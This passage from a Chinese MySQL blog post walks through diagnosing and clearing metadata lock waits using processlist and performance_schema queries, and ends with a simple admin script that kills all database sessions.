src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl12.png" alt="mdl12"></p><p>第九步：kill掉会话11后，成功将MDL锁释放。</p><blockquote><p>有人又会问咯：为什么不将数据库重启？</p><p>回答：</p><p>如果说——</p><ol><li><p>业务允许重启</p></li><li><p>不想找到问题的根源</p><p>那么重启吧</p></li></ol><p>如果说—— </p><ol><li><p>数据库上面多个库，关联多个业务，不能重启</p></li><li><p>想找到问题的根源，防止下次再次出现类似的问题</p><p>那么你懂的</p></li></ol><p>那么为什么不直接kill所有会话呢？同样如果你要找出问题的根源那么就排查，不想问为什么就直接kill吧，末尾有kill的脚本</p></blockquote><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl13.png" alt="mdl13"></p><p>一步步分析如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   17 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |   11 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 14 | root | localhost | uplooking | Query   |    5 | Waiting for table metadata lock | select * from booboo where id=3         |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   28 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 7 ;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 14;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   86 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   97 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果符合情况C，需要去查看performance_schema.events_statements_current表中是否有对booboo的错误语句（这里的错误语句是非语法错误的，例如select中写了不存在的列等情况）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从下面的查询结果可以看到，确实存在一个错误语句事件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过该错误语句事件的THREAD_ID，到performance_schema.threads表查到该线程对应的PROCESSLIST_ID，而PROCESSLIST_ID进程id等于processlist中的id</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.events_statements_current <span class="built_in">where</span> SQL_TEXT like <span class="string">'%booboo%'</span>\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">              THREAD_ID: 31</span><br><span class="line">               EVENT_ID: 16</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/alter_table</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3292336129737000</span><br><span class="line">              TIMER_END: 3521408438190000</span><br><span class="line">             TIMER_WAIT: 229072308453000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: alter table booboo add q9 int default 0</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">              THREAD_ID: 33</span><br><span class="line">               EVENT_ID: 74</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3521408132304000</span><br><span class="line">              TIMER_END: 3521408462141000</span><br><span class="line">             TIMER_WAIT: 329837000</span><br><span class="line">              LOCK_TIME: 184000000</span><br><span class="line">               SQL_TEXT: select * from performance_schema.events_statements_current where SQL_TEXT like '%booboo%'</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 1</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 1</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 1</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">              THREAD_ID: 40</span><br><span class="line">               EVENT_ID: 8</span><br><span class="line">           END_EVENT_ID: 8</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3280938133699000</span><br><span class="line">              TIMER_END: 3280938258470000</span><br><span class="line">             TIMER_WAIT: 124771000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: select abc from booboo</span><br><span class="line">                 DIGEST: 871dd43dfdfb143e81439bbe7bf7b57e</span><br><span class="line">            DIGEST_TEXT: SELECT `abc` FROM `booboo` </span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 1054</span><br><span class="line">      RETURNED_SQLSTATE: 42S22</span><br><span class="line">           MESSAGE_TEXT: Unknown column 'abc' in 'field list'</span><br><span class="line">                 ERRORS: 1</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select THREAD_ID,DIGEST_TEXT from performance_schema.events_statements_current <span class="built_in">where</span> DIGEST_TEXT=<span class="string">"SELECT `abc` FROM `booboo`"</span>;</span></span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">| THREAD_ID | DIGEST_TEXT                 |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">|        40 | SELECT `abc` FROM `booboo`  |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.threads <span class="built_in">where</span> thread_id=40\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">          THREAD_ID: 40</span><br><span class="line">               NAME: thread/sql/one_connection</span><br><span class="line">               TYPE: FOREGROUND</span><br><span class="line">     PROCESSLIST_ID: 15</span><br><span class="line">   PROCESSLIST_USER: root</span><br><span class="line">   PROCESSLIST_HOST: localhost</span><br><span class="line">     PROCESSLIST_DB: uplooking</span><br><span class="line">PROCESSLIST_COMMAND: Sleep</span><br><span class="line">   PROCESSLIST_TIME: 402</span><br><span class="line">  PROCESSLIST_STATE: NULL</span><br><span class="line">   PROCESSLIST_INFO: NULL</span><br><span class="line">   PARENT_THREAD_ID: NULL</span><br><span class="line">               ROLE: NULL</span><br><span class="line">       INSTRUMENTED: YES</span><br><span class="line">            HISTORY: YES</span><br><span class="line">    CONNECTION_TYPE: Socket</span><br><span class="line">       THREAD_OS_ID: 22758</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40;</span></span><br><span class="line">+----------------+</span><br><span class="line">| PROCESSLIST_ID |</span><br><span class="line">+----------------+</span><br><span class="line">|             15 |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from information_schema.processlist <span class="built_in">where</span> id=(select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40);</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| ID | USER | HOST      | DB        | COMMAND | TIME | STATE | INFO |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |  466 |       | NULL |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 15;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> alter table booboo add q9 int default 0;</span></span><br><span class="line">Query OK, 0 rows affected (9 min 54.35 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure><h2 id="小知识点总结"><a href="#小知识点总结" class="headerlink" title="小知识点总结"></a>小知识点总结</h2><h3 id="三张表的关系"><a href="#三张表的关系" class="headerlink" title="三张表的关系"></a>三张表的关系</h3><blockquote><p>MySQL 5.6</p></blockquote><ol><li><code>performance_schema</code>库中，<code>events_statements_current</code>表中<code>theard_id</code>与<code>threads</code>表中的<code>thread_id</code>相同</li><li><code>performance_schema</code>库中，threads表中，thread_id和processlist_id为对应关系，<code>thread_id</code>表示一个独特的线程标识符;<code>processlist_id</code>是<code>show processlist</code>显示的<code>id</code>值，连接标识符；而对于后台线程(与用户连接不相关的线程)，<code>PROCESSLIST_ID</code>为空，此值不是唯一的。</li><li><code>information_schema</code>库中,<code>PROCESSLIST</code>表是一个非标准表。<code>id</code>连接标识符，并由CONNECTION_ID()函数返回。</li></ol><table><thead><tr><th>performance_schema</th><th>performance_schema</th><th>performance_schema</th><th>information_schema</th></tr></thead><tbody><tr><td>events_statements_current</td><td>threads</td><td>threads</td><td>processlist</td></tr><tr><td>THREAD_ID</td><td>THREAD_ID</td><td>PROCESSLIST_ID</td><td>ID</td></tr></tbody></table><h3 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h3><ol><li>线程表中保存了所有线程的信息，有前台的有后台运行的；</li><li>如果是由连接产生的线程，一般都是前台线程，会分配一个processlist_id，可以在information_schema.processlist中看到</li></ol><h3 id="资料参考"><a href="#资料参考" class="headerlink" title="资料参考"></a>资料参考</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/threads-table.html" target="_blank" rel="noopener">官网关于threads表的说明</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/show-processlist.html" target="_blank" rel="noopener">官方关于processlist表的说明</a></p><p><a href="http://www.voidcn.com/article/p-hjsjvnlz-bog.html" target="_blank" rel="noopener">MySQL5.7 MetaData Lock 案例分享</a></p><h3 id="不同版本"><a href="#不同版本" class="headerlink" title="不同版本"></a>不同版本</h3><blockquote><p>MySQL 5.7</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">select * from performance_schema.events_statements_current\G</span><br><span class="line">select * from sys.x$session\G</span><br><span class="line">select * from sys.x$processlist\G</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from x$session\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 3904</span><br><span class="line">               conn_id: 3879</span><br><span class="line">                  user: root@localhost</span><br><span class="line">                    db: sys</span><br><span class="line">               command: Query</span><br><span class="line">                 state: Sending data</span><br><span class="line">                  time: 0</span><br><span class="line">     current_statement: select * from x$session</span><br><span class="line">     statement_latency: 1564453000</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: 847000000</span><br><span class="line">         rows_examined: 0</span><br><span class="line">             rows_sent: 0</span><br><span class="line">         rows_affected: 0</span><br><span class="line">            tmp_tables: 4</span><br><span class="line">       tmp_disk_tables: 1</span><br><span class="line">             full_scan: YES</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: 12880</span><br><span class="line">          program_name: mysql</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line">mysql&gt; select * from  x$processlist limit 1\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 1</span><br><span class="line">               conn_id: NULL</span><br><span class="line">                  user: sql&#x2F;main</span><br><span class="line">                    db: NULL</span><br><span class="line">               command: NULL</span><br><span class="line">                 state: NULL</span><br><span class="line">                  time: 230927</span><br><span class="line">     current_statement: NULL</span><br><span class="line">     statement_latency: NULL</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: NULL</span><br><span class="line">         rows_examined: NULL</span><br><span class="line">             rows_sent: NULL</span><br><span class="line">         rows_affected: NULL</span><br><span class="line">            tmp_tables: NULL</span><br><span class="line">       tmp_disk_tables: NULL</span><br><span class="line">             full_scan: NO</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: NULL</span><br><span class="line">          program_name: NULL</span><br><span class="line">1 row in set (0.06 sec)</span><br><span class="line">mysql&gt; select * from information_schema.processlist;</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| ID   | USER | HOST      | DB   | COMMAND | TIME | STATE     | INFO                                         |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| 3879 | root | localhost | sys  | Query   |    0 | executing | select * from information_schema.processlist |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="MDL故障自愈"><a href="#MDL故障自愈" class="headerlink" title="MDL故障自愈"></a>MDL故障自愈</h2><h3 id="kill所有会话"><a href="#kill所有会话" class="headerlink" title="kill所有会话"></a>kill所有会话</h3><blockquote><p>不想知道故障原因，只想快速解决故障</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉 所有会话</span></span><br><span class="line">user=xxx</span><br><span class="line">password=xxx</span><br><span class="line">host=xxxx.mysql.rds.aliyuncs.com</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">mysql -u$user -p$password -h$host  -P$port -e "select  concat('KILL ',id,';') from information_schema.processlist;" &gt; tmpfile</span><br><span class="line"></span><br><span class="line">awk '&#123;if (NR != 1) print $0 &#125;' tmpfile | mysql -u$user -p$password -h$host  -P$port</span><br></pre></td></tr></table></figure><h3 id="MDL故障排查和解决"><a href="#MDL故障排查和解决" class="headerlink" title="MDL故障排查和解决"></a>MDL故障排查和解决</h3><p><a href="https://github.com/BoobooWei/DevOps-Database-Troubleshooting/blob/master/fault_self_healing_metadatalock.py" target="_blank" rel="noopener">MDL故障自愈脚本GitHub地址</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。&lt;/p&gt;
&lt;p&gt;今天有客户(MySQL 5.6)遇到该问题，最关键的是属于第三种情况，google上根本找不到类似的故障案例，唯一一个非常接近的故障案例中数据库版本却不同（具体看下文慢慢聊），哎，困难重重啊，最终还是解决了哈。&lt;/p&gt;
&lt;p&gt;alter table的语句是很危险的，在操作之前最好确认对要操作的表没有任何进行中的操作、没有未提交事务、也没有显式事务中的报错语句。如果有alter table的维护任务，在无人监管的时候运行，最好通过lock_wait_timeout设置好超时时间，避免长时间的metedata锁等待。&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="锁故障" scheme="http://www.toberoot.com/tags/%E9%94%81%E6%95%85%E9%9A%9C/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第一课 简介和变量</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.748Z</updated>
    
